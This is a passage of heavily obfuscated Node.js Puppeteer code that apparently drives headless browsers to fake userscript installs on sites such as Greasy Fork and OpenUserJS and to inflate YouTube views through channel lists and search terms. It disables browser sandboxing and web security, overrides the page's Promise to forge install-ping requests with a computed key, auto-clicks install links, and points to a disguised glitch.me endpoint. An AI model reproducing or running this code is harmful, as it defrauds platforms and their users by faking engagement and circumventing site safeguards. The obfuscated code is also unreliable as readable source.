                K = Q[J - (-0xa * -0x2e3 + 0x25ce * -0x1 + -0x1 * -0x8f3)] ^ Q[J - (0x161f + -0x1fa5 + 0x98e)] ^ Q[J - (-0x1d4d + -0x1 * 0x1ac9 + 0x3824)] ^ Q[J - (-0x14a4 + 0x17b9 * -0x1 + 0x2c6d)], Q[J] = K << 0x2139 + -0xd2b + 0xb1 * -0x1d | K >>> 0xc32 * 0x2 + -0x21fc + 0x1 * 0x9b7;
              for (J = -0x89c + -0x595 * 0x1 + 0xe31; J < 0x1f7f + 0x1e1f + -0x3d8a; J += -0xa00 + 0x1e + 0x41 * 0x27)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x7 * -0x328 + -0x10e9 + -0x10e * -0x25 | L >>> 0x1 * 0x1b77 + 0xc7 * 0x12 + -0x43 * 0x9e) + (M & N | ~M & O) + P + (-0x651d3958 + 0x888caec6 + 0x3713042b) + Q[J] << 0x2 * -0x994 + -0x7b1 * 0x4 + 0x31ec) << -0xe95 + -0x12b * 0x13 + 0x24cb * 0x1 | P >>> 0xee9 * 0x1 + 0x716 + -0x15e4) + (L & (M = M << 0x11 * 0xa6 + -0x1860 + 0xd78 | M >>> -0x10fc * 0x1 + -0x1 * -0x1816 + 0x2 * -0x38c) | ~L & N) + O + (-0x2e705b52 + 0x52 * -0x8eb4aa + -0x27 * -0x4aefe09) + Q[J + (-0x376 * 0x1 + 0x1 * -0x1753 + -0x2fa * -0x9)] << 0x1b63 + -0x3 * 0xeb + -0x18a2) << -0xff6 + -0xfd + 0x10f8 | O >>> 0xd * -0x1b + -0xd * -0x66 + -0x3b4) + (P & (L = L << -0x1 * 0x10d + -0x14f1 + 0x161c | L >>> -0x1e74 + -0x26df + 0x4555 * 0x1) | ~P & M) + N + (-0x14d5ecf5 + 0x3347c * 0x3253 + -0x3 * 0x10a5f1e2) + Q[J + (-0x6e * 0x2e + -0x17af + -0x1bd * -0x19)] << -0x2438 + 0x1 * -0x52d + 0x2965) << -0x4d * -0x71 + -0x49 * -0x67 + -0x159 * 0x2f | N >>> 0x1e3b * -0x1 + 0x2ef * 0xa + -0x100 * -0x1) + (O & (P = P << -0x1 * -0x18d6 + -0x11a8 + -0x10 * 0x71 | P >>> 0x11e6 + -0x245 * -0xd + 0x44f * -0xb) | ~O & L) + M + (-0x39bd4446 + -0x4aacc583 + -0x25276b3b * -0x6) + Q[J + (-0x1b6b * -0x1 + 0x1 * 0x1c9a + 0xd6 * -0x43)] << 0x296 * -0x9 + -0x25d1 + 0xd * 0x4b3) << -0x1edf + -0x1 * -0x459 + -0x97 * -0x2d | M >>> -0x2b3 + 0x91d * -0x4 + 0x2742 * 0x1) + (N & (O = O << 0x2 * -0xda3 + 0x1976 + -0xd * -0x26 | O >>> -0x155 * -0x2 + -0x3ae + -0x106 * -0x1) | ~N & P) + L + (-0x5be68244 + 0x2eabbea + 0xb37e3ff3) + Q[J + (0x1 * -0x50e + -0x37 * -0x13 + -0x17 * -0xb)] << -0x14d0 + -0x188d + 0x2d5d, N = N << -0xdd0 + 0x252d + 0x173f * -0x1 | N >>> 0x2 * 0x75 + 0x1495 + 0x1 * -0x157d;
              for (; J < 0x5 * 0x2f7 + 0xf0a + -0x1db5; J += -0xd67 + -0x15a6 + 0x2312)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x16e0 + -0x1a3e + 0x1 * 0x3123 | L >>> 0x9f5 + 0x50b + 0x7b * -0x1f) + (M ^ N ^ O) + P + (-0xdbfc802b + -0x8286d937 + 0x1cd5d4503) + Q[J] << -0x4 * -0x332 + 0x1 * -0xd39 + 0x71) << 0x118 + 0x226a + -0x237d | P >>> -0x1b * 0x3e + -0xfa * 0x15 + -0x1b27 * -0x1) + (L ^ (M = M << 0x2682 + 0x1be0 + -0x4244 | M >>> 0x203e * -0x1 + -0xa76 + 0x2ab6) ^ N) + O + (-0x56 * 0x10146f1 + 0xd42f * 0xfaac + -0xa7cb4fd) + Q[J + (-0x2 * -0x6a + -0xd1c + 0xc49)] << 0x1da7 * 0x1 + 0xe96 + -0x2c3d) << -0x9b * 0x35 + -0x1e91 + -0xc89 * -0x5 | O >>> -0x1b1 + 0x16cd * 0x1 + -0x1501) + (P ^ (L = L << 0x749 + -0x106 * 0xa + 0x9d * 0x5 | L >>> -0x1c15 + -0x1 * -0x725 + -0xa79 * -0x2) ^ M) + N + (0xc157d3b3 + 0xdff69 * 0x511 + -0x9968eb0b) + Q[J + (0x2 * 0x8f9 + 0x121c + 0x1206 * -0x2)] << -0x2 * -0x245 + 0x397 + -0x821) << 0x80 + -0x19 * 0x9b + 0xea8 | N >>> 0x1d87 + 0x1e87 + 0x95 * -0x67) + (O ^ (P = P << -0x878 * -0x1 + 0x8 * -0x5 + -0x832 | P >>> -0xa33 + 0x1f3 * 0x2 + 0x13 * 0x55) ^ L) + M + (-0xfad * 0x8638d + 0x432bd56d + 0xaf2e9f7d) + Q[J + (0x29 * 0x2f + -0x1 * 0x1c1f + 0x1 * 0x149b)] << -0xd34 + 0x206f + 0x223 * -0x9) << -0x699 * -0x2 + 0x250 + -0xf7d | M >>> 0xfff + -0x150f + 0x52b) + (N ^ (O = O << -0x85 * -0x7 + 0x22c0 + -0x2645 * 0x1 | O >>> 0x24fb * 0x1 + 0x1bcf + -0x40c8) ^ P) + L + (0xcaf5e164 + 0x4b61 * 0x1ea97 + -0xec9015fa) + Q[J + (-0x615 + 0x4 * -0xa0 + -0x47 * -0x1f)] << -0xf1c + -0x110 * 0x1c + 0x2cdc, N = N << -0x69b * -0x3 + -0x1 * 0x21e6 + 0xe33 | N >>> -0x1 * -0xc6d + -0xf80 + 0x315;
              for (; J < -0x1e61 + 0xabd * 0x3 + -0x19a * 0x1; J += -0x1 * -0x16bf + -0x1d92 + 0x2 * 0x36c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x96 * 0x9 + 0x1ed5 + 0x2416 * -0x1 | L >>> -0x1f * -0xe5 + 0x2 * 0xf73 + 0x552 * -0xb) + (M & N | M & O | N & O) + P - (-0x2b58f * 0x2149 + -0x9e6c9cd1 + 0xac * 0x21a090d) + Q[J] << -0x1cac + -0x4f9 * -0x7 + -0x623) << 0xec1 + 0xbf9 + -0x1ab5 | P >>> 0x1540 + -0x1 * -0x4ff + -0x1a24) + (L & (M = M << 0x1f0 * 0xe + -0x61 * -0xd + -0x1fef | M >>> 0x71 * 0xd + -0x425 * -0x2 + -0xe05) | L & N | M & N) + O - (-0x81d7c639 + -0xc * 0x805fdb6 + -0x2179 * -0xa20cd) + Q[J + (-0x24e6 + 0x2480 + 0x67)] << 0x23d8 + -0x83 * -0x21 + -0x1 * 0x34bb) << -0x2264 + -0x99 + 0x2302 | O >>> 0xe08 + -0x1d7 * 0x1 + -0xe * 0xdd) + (P & (L = L << -0x1 * -0x1d8b + -0x2380 + 0x137 * 0x5 | L >>> 0x3a * -0xf + -0x8a * -0x45 + -0x21ca) | P & M | L & M) + N - (-0x2fd16 * 0xb72 + -0x9 * -0x1847906f + -0x421 * 0x114c17) + Q[J + (0x2658 + 0x55a + -0x6 * 0x748)] << 0x3 * 0x7b2 + -0x2231 * 0x1 + 0xb1b) << -0x17e2 + 0x1331 + 0x3 * 0x192 | N >>> 0x1 * -0x1f12 + 0x1218 + 0xc5 * 0x11) + (O & (P = P << 0xd84 * -0x2 + -0x1 * 0xfcb + -0x2af1 * -0x1 | P >>> -0x2054 + 0x1 * 0x1d9f + 0x5 * 0x8b) | O & L | P & L) + M - (-0x1 * 0x22866291 + -0x2 * 0x35d44f69 + 0x55066c2d * 0x3) + Q[J + (0x1880 + 0x1ee5 + -0x3762)] << 0x1d * -0xfd + -0x15f1 + -0x6 * -0x86f) << 0x1c81 + 0x5 * -0x76d + 0x8a5 | M >>> 0x13a8 + -0x1 * -0x26b4 + -0x3a41) + (N & (O = O << -0x19 * 0x138 + -0x1 * -0x8a1 + 0x15f5 | O >>> -0x3 * 0x7b3 + 0x255c + -0x29 * 0x59) | N & P | O & P) + L - (0xb571ad11 + -0x594227b * -0x1 + 0x944318d * -0x8) + Q[J + (-0x14c1 + -0x1619 * 0x1 + 0x76 * 0x5d)] << -0x921 * -0x3 + 0x7 * 0x484 + -0x3aff, N = N << -0x1273 + 0x2 * 0x9ac + -0xc7 | N >>> 0x1 * -0xd1 + -0x1e89 + 0x12 * 0x1be;
              for (; J < 0xb8e + 0x59 * 0x5 + -0xcfb; J += 0x4 * 0x45 + 0x63e + 0x7 * -0x10b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xb * -0x1fa + 0x1 * -0x17c7 + 0xf2e * 0x3 | L >>> -0x690 + 0x1 * 0x4ff + 0x1ac) + (M ^ N ^ O) + P - (-0x1 * -0x53405c2f + 0x31a37930 + 0x38f * -0x1646fb) + Q[J] << 0x15b6 + 0x2441 + 0xd1 * -0x47) << -0x1159 * -0x2 + 0x1d5a + -0x4007 | P >>> 0x2117 + -0x1dc + -0x1f20) + (L ^ (M = M << 0x83a + 0x99 * -0x12 + 0x2a6 | M >>> -0x1 * 0x2657 + -0x3 * -0x1b1 + -0x10a3 * -0x2) ^ N) + O - (-0x1 * -0x33f88e7f + -0x515a670d + 0x1 * 0x52ff16b8) + Q[J + (0x1 * -0xdf0 + 0x1927 + -0xb36)] << -0x5c * 0x6 + -0x497 + 0x6bf) << 0x1 * 0x2075 + 0x1aec * -0x1 + 0x2 * -0x2c2 | O >>> -0xc50 + -0x100b * 0x2 + 0x2c81) + (P ^ (L = L << 0x5 * -0x1c2 + 0x11d8 + -0x8f0 | L >>> 0x1 * 0x1a14 + -0x23f * -0xe + -0x3984) ^ M) + N - (0x3c705fde + -0x66bdd * -0x78d + -0x44132e1 * 0xd) + Q[J + (-0x1 * 0x1e79 + 0x122 * 0x1e + -0x3 * 0x12b)] << 0x4b2 + 0x27 * 0x62 + -0x4 * 0x4e8) << -0x5 * 0x267 + 0x1378 + -0x770 * 0x1 | N >>> 0x312 + 0x3 * -0x5fc + 0x3 * 0x4ff) + (O ^ (P = P << 0xe03 * 0x1 + 0x166b * -0x1 + 0x443 * 0x2 | P >>> 0x2309 + -0x139d + -0xf6a) ^ L) + M - (-0xc8ee * -0x2024 + -0x313f8a * -0x49 + 0xe581e58) + Q[J + (0x115b + -0x24b5 * 0x1 + 0x135d)] << 0x1f4e * -0x1 + 0x5 * 0x6cd + -0x2b3) << -0x8 * -0x1df + -0x3 * 0x1a7 + -0x9fe | M >>> -0x1663 + -0x16b6 + -0x169a * -0x2) + (N ^ (O = O << -0x1 * -0x63 + 0x2175 + -0x1 * 0x21ba | O >>> -0x2 * 0x4eb + 0x5f * 0x43 + -0x1 * 0xf05) ^ P) + L - (0x3220098e + -0x43cc97ac + 0x4749cc48) + Q[J + (0x1 * -0x13fd + -0x1 * 0x27 + -0x2b * -0x78)] << 0x7ee + 0x8 * -0x430 + 0x2 * 0xcc9, N = N << -0xd02 + 0x1 * -0x6c4 + 0x13e4 | N >>> -0x57b + -0x1 * 0x28b + 0x1 * 0x808;
              this['h0'] = this['h0'] + L << -0x21ac + -0x2 * -0x21e + 0x1d70, this['h1'] = this['h1'] + M << 0xe5 * -0x1b + -0x154d * 0x1 + 0x2d74, this['h2'] = this['h2'] + N << -0x25e9 + -0xc5f + 0x3248, this['h3'] = this['h3'] + O << 0x30 + 0x24ee * 0x1 + 0x1 * -0x251e, this['h4'] = this['h4'] + P << 0x111e + -0x122b + 0x10d;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x2566 + 0x1 * 0x5ab + 0x2e5 * 0xb & -0x452 * 0x1 + 0x1cfd + -0x189c] + w[J >> 0x14de + 0x1c5f * 0x1 + -0x3125 & -0x61b + -0x1 * 0xb8b + 0x11b5] + w[J >> 0xfec + 0x1 * -0x131e + 0x346 * 0x1 & -0x47f * 0x2 + 0xc8f + 0x1 * -0x382] + w[J >> 0x7a * 0x1 + -0x44a + 0x3e0 & 0x4 * 0x773 + 0x502 + -0x22bf] + w[J >> 0x9df * -0x1 + 0x1 * 0x1b0f + 0x2 * -0x892 & -0xa8f * 0x3 + 0x116 + 0x1ea6] + w[J >> -0x24ca + 0x21f9 + -0x9 * -0x51 & -0x7dc + 0x298 * -0x1 + 0xa83] + w[J >> 0x196f + -0x23aa + -0x1 * -0xa3f & -0x7 * -0x515 + -0x1f6e + -0x416] + w[0x1 * -0x1605 + -0xfe9 + 0x5 * 0x799 & J] + w[K >> 0x1 * -0xc1a + 0x1143 + -0x50d & 0x3fc + -0x1 * 0xba3 + 0x7b6 * 0x1] + w[K >> 0x154e + -0xa2c + -0xb0a & 0x11 * -0x1aa + 0x8 * -0x4b2 + 0x1 * 0x41e9] + w[K >> 0x18f6 + -0x14b7 + -0x42b & 0x1a24 + 0x564 + -0x47f * 0x7] + w[K >> -0x8e * 0x6 + 0x887 * -0x2 + 0x1472 & 0x16f9 + -0x3 * 0xb1e + 0x8 * 0x14e] + w[K >> 0x115 * 0x22 + -0x1 * 0x167a + -0xe44 & -0x1 * 0x1a7d + -0x25e6 * -0x1 + -0xb5a] + w[K >> 0x11b1 + 0x45 * 0xd + -0x152a & 0x1aec + -0x17b6 + -0x10d * 0x3] + w[K >> 0x8bd * -0x1 + -0x1f70 + 0x2831 & 0x22d8 + -0x12e0 * 0x2 + 0x2f7] + w[0xe05 + -0x1a22 + 0x1 * 0xc2c & K] + w[L >> -0x95 * -0x3b + 0x1e43 + 0x82 * -0x7f & 0xb7b * -0x1 + 0xb * -0x32b + -0x5 * -0x947] + w[L >> -0x1e99 + 0x262b + 0x42 * -0x1d & 0x680 + 0x2568 + -0x2bd9] + w[L >> 0xb33 + -0x17 * 0x141 + 0x11b8 & -0x29a * 0x7 + 0x958 + 0x8ed] + w[L >> 0x1 * 0x157b + -0x198c + 0x421 & -0x1d * -0x14c + -0x6c5 * 0x1 + -0x1ec8] + w[L >> -0x1 * 0x10f + -0x1d88 + -0x155 * -0x17 & -0x44e + -0xc7f * -0x3 + -0x2120] + w[L >> 0x1cee * -0x1 + -0x9c5 * -0x3 + -0x59 & 0x15e1 * 0x1 + -0x1d * -0xa6 + 0xa * -0x410] + w[L >> -0x15d * 0x14 + -0x1 * -0x1384 + 0x1 * 0x7c4 & -0x8cd * 0x4 + 0xc04 + 0x173f] + w[-0x1a1c + 0x2b5 + 0x4d * 0x4e & L] + w[M >> -0x2205 * -0x1 + -0xdd4 * 0x2 + -0x641 & -0x1 * 0x8d6 + -0x1400 + 0x1ce5] + w[M >> 0xffd * 0x1 + -0xa95 + -0x11 * 0x50 & -0x11b + 0xd * -0x22 + 0x14 * 0x25] + w[M >> 0x6 * -0x609 + -0x15b3 + 0x39fd & -0x4b7 * 0x6 + -0x369 + 0x1fc2] + w[M >> -0x8e7 + -0x1fc + -0xaf3 * -0x1 & 0x1946 + 0x165e + -0x2f95 * 0x1] + w[M >> 0x631 * -0x3 + -0x9cb + 0x1c6a * 0x1 & -0x1 * 0x1183 + 0x58 + 0x113a] + w[M >> -0x5c + 0x1e * 0x11b + 0x1063 * -0x2 & -0x5 * -0x335 + 0xaa2 * -0x2 + 0x2 * 0x2a5] + w[M >> -0x143c + -0x1f81 + -0x33c1 * -0x1 & 0x1c9d + 0x54f + 0x21dd * -0x1] + w[0x8 * -0x494 + -0xb41 + -0x4 * -0xbfc & M] + w[N >> -0x6c9 + -0x3fa + 0xadf & -0x1a7a * 0x1 + -0x21a * -0x5 + 0x1007] + w[N >> 0x1 * 0x25e3 + 0x22f * 0xb + -0x56 * 0xb8 & 0x1 * -0xa4e + -0x1274 + 0x1cd1] + w[N >> 0x1954 + 0x1c20 + -0x3560 & -0x1235 + 0x1 * -0x9ad + 0x1bf1] + w[N >> -0x2 * 0xb23 + -0x1f8c + 0x3 * 0x11f6 & -0x50 * 0x9 + -0x202a + 0x1 * 0x2309] + w[N >> 0x2433 + 0x49 * -0x4 + -0x2303 & 0x20a * 0xe + 0x1066 + -0x2ce3 * 0x1] + w[N >> 0x637 * -0x2 + 0x2334 + -0x16be & -0x1a51 + 0x2f3 + 0x7cf * 0x3] + w[N >> -0xb3 * 0xc + -0x3a8 + 0xc10 & 0x1fb6 + 0x7a9 + -0x2750] + w[-0x2226 + 0xbcc + 0x1669 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1 * 0xbdd + 0x1982 + 0x3 * -0xc6d & 0x1 * -0x121f + 0x19df * -0x1 + 0x3 * 0xeff,
                J >> -0x1253 + -0x2a + -0x1 * -0x128d & -0x5 * -0x43f + -0x6c8 + -0xd74,
                J >> 0x340 + -0x1 * 0x4e1 + -0x5 * -0x55 & 0x1 * 0xa4e + -0x1 * -0xa52 + -0x4b * 0x43,
                0x1439 + -0x1 * -0x22ed + -0x3 * 0x120d & J,
                K >> -0x1b20 + 0x7 * -0x71 + -0x1 * -0x1e4f & -0x32 * 0x7d + 0x13df + -0x2c5 * -0x2,
                K >> 0xa9 * 0x3 + 0x337 * 0xb + 0x2 * -0x12a4 & 0x6 * 0x17f + 0x127e + -0xfb * 0x1b,
                K >> 0x2171 + 0x139 * 0xa + -0x2da3 & 0x17ce + 0x1 * -0x23 + -0x16ac,
                -0x1e9d + -0x47 * 0x4f + 0x3585 & K,
                L >> -0x18fc + 0xfa4 + 0x970 & -0x1 * -0xe97 + -0x1765 + -0x9cd * -0x1,
                L >> -0x10a6 + 0xde0 + 0x2d6 & 0x1 * 0x238 + -0x1b2d + -0x1 * -0x19f4,
                L >> -0x1c * -0xe0 + -0x16 * 0xfd + -0x2ba & 0x13f + -0x339 * -0x9 + -0x1d41,
                0x39d * 0x2 + 0x22ca + -0x2905 & L,
                M >> -0xed * -0x24 + 0x3 * -0x571 + -0x9 * 0x1e1 & 0x11f0 + -0xa59 + -0x1a6 * 0x4,
                M >> 0xc9c + 0xe50 * -0x1 + -0x1c4 * -0x1 & -0x1 * -0x1619 + -0x1e21 + -0x1 * -0x907,
                M >> -0x8b * -0x40 + -0x706 + -0x1bb2 & 0x1ab4 * -0x1 + -0x7 * -0x1ee + -0x7 * -0x207,
                0x14b4 + 0x180c + -0x1 * 0x2bc1 & M,
                N >> 0x1827 + -0x29 * -0x4d + -0x2464 & -0xe70 * 0x1 + -0x87f + 0x17ee * 0x1,
                N >> 0x5b3 + 0x12b3 + 0xb2 * -0x23 & -0x8 * 0xec + -0x1 * -0x2069 + 0x22 * -0xb5,
                N >> -0x1cbe + 0x1f83 + -0x2bd & 0x60f + -0x1 * 0x22e1 + 0x1dd1,
                -0xe5 * 0x9 + 0x178d + -0xe81 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1827 + -0x198f * 0x1 + 0xa * 0x26), (K = new DataView(J))['setUint32'](-0x3 * -0x933 + -0xed2 + -0xcc7, this['h0']), K['setUint32'](-0x3a6 * 0x4 + 0x1501 * 0x1 + -0x665, this['h1']), K['setUint32'](0x21b4 + 0xe5b * -0x1 + -0x1351, this['h2']), K['setUint32'](-0x1a87 * -0x1 + 0xff + 0x1b7a * -0x1, this['h3']), K['setUint32'](0x6e * 0x3b + -0x1 * 0xf49 + -0xa01, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x2215 + 0x9 * 0x1ae + -0x3133];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1 * -0x70f + -0x2149 + 0x1a3a;
            J[-0x2284 + 0x1c87 + 0x5fd]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x5 * 0x20e + -0x1191 * -0x2 + -0x2d68] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1 * -0x2592 + 0x77d + 0x1e16), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1704 * 0x1 + 0xc1 * -0x1b + 0x2b60;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1be5 + -0x71c + 0xeed * -0x1), Promise['resolve'](0x1f * -0x140 + 0x178f * -0x1 + -0x8 * -0x7ca);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x3b * 0x39 + 0x4d5 + -0x11f8; j < -0x3 * 0x63d + -0x2 * -0x8a7 + 0x16a; j++)
    i();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x18d5 + 0x9f + -0x409 * -0x6);
    let h = e[f];
    if (c['WKkjTj'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x18c5 + 0x2 * 0x74f + 0xa27, r, s, t = -0x115a + -0x409 + 0x1563; s = m['charAt'](t++); ~s && (r = q % (0x1fc9 + 0x1 * -0xa0d + 0x2b7 * -0x8) ? r * (-0x99f * 0x3 + -0x1020 + 0x2d3d) + s : s, q++ % (0xddd + -0x1 * 0xb7a + -0x25f * 0x1)) ? o += String['fromCharCode'](0x1642 + -0x1 * -0xa0c + 0x23 * -0xe5 & r >> (-(-0x2 * 0x1025 + 0x788 + 0x27a * 0xa) * q & 0x1c * -0x81 + -0x71a + 0x153c)) : -0x946 * 0x1 + -0x197d + 0x22c3) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1 * 0x201b + 0x3 * 0x778 + -0x3683, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x69e + 0x7c0 + -0xe4e))['slice'](-(0xa9c * -0x1 + 0xb * -0x2 + -0x5 * -0x224));
        }
        return decodeURIComponent(p);
      };
      c['pjXOaW'] = i, b = arguments, c['WKkjTj'] = !![];
    }
    const j = e[-0x7 * -0x261 + -0x34d + -0xd5a],
      k = f + j,
      l = b[k];
    return !l ? (h = c['pjXOaW'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const NETWORK_PATIENCE = 0x5f8 + -0x260a + 0x3f52 + (0x1 * -0x2b3 + 0x1ac + 0xcbf) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x3a4 + -0x4 * 0x37f + 0xa5b) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0xf71 + -0x3b9 + -0x132a * -0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + W(0x10, 'Pd^)') + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + X(0x3) + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x5e5 * -0x1 + 0x91 * -0x25 + 0xf1a)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x27a * -0x2 + -0x268d + -0x1 * -0x2b8b)), searchTerms['push'](('bts,bts\x20v,' + Y(0x13) + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' 